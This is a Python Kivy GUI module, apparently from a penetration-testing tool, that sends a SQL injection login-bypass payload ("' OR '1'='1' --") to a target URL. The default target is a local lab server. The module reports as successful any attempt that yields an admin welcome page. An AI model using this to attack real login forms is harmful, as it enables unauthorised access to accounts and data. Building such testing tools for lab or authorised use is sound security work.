import threading
import requests
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.widget import Widget
from gui.global_variables import default_button_height, default_padding_1
from gui.utils.console_view import ConsoleView
from gui.utils.custom_layout import CustomHeightLayout
from gui.utils.text_input_widget import TextInputWidget

# Storage for SQL Injection results
successful_injections = []
failed_injections = []


# Helper Functions for Managing Results
def add_successful_injection(payload):
    """Log a successful injection payload."""
    successful_injections.append(payload)


def add_failed_injection(payload):
    """Log a failed injection payload."""
    failed_injections.append(payload)


def get_successful_injections():
    """Retrieve successful injection payloads."""
    return successful_injections


def get_failed_injections():
    """Retrieve failed injection payloads."""
    return failed_injections


def output_sql_injection_report(report_view: ConsoleView):
    """Generate and display a report of the SQL Injection test results."""
    report_results = f"--------------SQL Injection Attack Report START--------------\n"
    report_results += f"[INFO] Successful Injections: {len(get_successful_injections())}\n"

    for payload in get_successful_injections():
        report_results += f"Payload: {payload}\n" + "-" * 50 + "\n"

    report_results += f"[INFO] Failed Injections: {len(get_failed_injections())}\n"

    for payload in get_failed_injections():
        report_results += f"Payload: {payload}\n" + "-" * 50 + "\n"

    total_tests = len(get_successful_injections()) + len(get_failed_injections())
    report_results += f"[INFO] Total Payloads Tested: {total_tests}\n"
    report_results += f"--------------SQL Injection Attack Report END--------------\n"

    report_view.add_text_schedule(report_results)


class SqlInjectionView(BoxLayout):
    def __init__(self, console_view: ConsoleView, report_view: ConsoleView, **kwargs):
        super(SqlInjectionView, self).__init__(**kwargs)
        self.console_view = console_view
        self.report_view = report_view

        self.orientation = 'vertical'
        self.padding = 10
        self.spacing = 10

        # Add URL Input Field
        self.url_view = TextInputWidget(
            "http://127.0.0.1:9000/login", "Target URL", "Enter the Target URL"
        )
        self.add_widget(self.url_view)

        # Add Username Field
        self.username_field = TextInputWidget(
            "' OR '1'='1' --", "SQL Injection Payload (Username)", "Custom SQL injection for username"
        )
        self.add_widget(self.username_field)

        # Add Password Field
        self.password_field = TextInputWidget("password", "Password", "Enter password")
        self.add_widget(self.password_field)

        # Add a spacer to push buttons to the bottom
        self.add_widget(BoxLayout(size_hint_y=1))  # Spacer

        # Button layout at the bottom using CustomHeightLayout
        button_layout = BoxLayout(orientation='vertical', size_hint_y=None)

        # Add Start SQL Injection Button
        start_button_layout = CustomHeightLayout(height=default_button_height)
        self.start_button = Button(text="Start SQL Injection Test")
        self.start_button.bind(on_press=self.start_sql_injection_thread)
        start_button_layout.add_widget(self.start_button)
        button_layout.add_widget(start_button_layout)

        # Add the button layout to the main view
        self.add_widget(button_layout)

    def start_sql_injection_thread(self, instance):
        """Start the SQL Injection attack in a separate thread."""
        threading.Thread(target=self.start_sql_injection, daemon=True).start()

    def start_sql_injection(self):
        """Perform the SQL Injection test."""
        target_url = self.url_view.get_text().strip()
        username = self.username_field.get_text().strip()
        password = self.password_field.get_text().strip()

        if not target_url:
            self.console_view.add_text_schedule("[ERROR] Please enter a valid Target URL before starting the test.")
            return

        self.console_view.add_text_schedule(f"Starting SQL Injection Test on {target_url}...")

        parameters = {"username": username, "password": password}

        try:
            response = requests.post(target_url, data=parameters)

            self.console_view.add_text_schedule(f"[INFO] Sent payload: {parameters}")
            self.console_view.add_text_schedule(f"[INFO] Response Status Code: {response.status_code}")
            self.console_view.add_text_schedule(f"[INFO] Response Text: {response.text[:200]}")  # Limit response text

            # Example condition to classify successful/failed injections
            if "<h2>Welcome admin!</h2>" in response.text:  # Adjust based on the server's response
                add_successful_injection(username)
            else:
                add_failed_injection(username)
        except Exception as e:
            self.console_view.add_text_schedule(f"[ERROR] Failed to send request: {e}")

        # Automatically generate and display the report
        self.console_view.add_text_schedule("[INFO] SQL Injection Test Complete. Generating Report...")
        output_sql_injection_report(self.report_view)
